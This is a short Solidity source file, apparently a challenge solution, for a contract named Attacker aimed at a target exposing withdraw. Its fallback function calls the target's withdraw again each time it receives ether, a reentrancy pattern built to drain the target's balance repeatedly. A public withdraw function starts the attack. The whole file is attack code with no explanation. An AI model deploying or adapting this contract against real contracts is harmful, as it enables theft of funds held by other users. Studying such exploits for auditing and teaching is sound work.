// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IFallback {
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IFallback ifallback;

    constructor(address _address) {
        ifallback = IFallback(_address);
    }

    fallback() external payable {
        ifallback.withdraw(msg.value);
    }

    function withdraw(uint256 _amount) public {
        ifallback.withdraw(_amount);
    }

}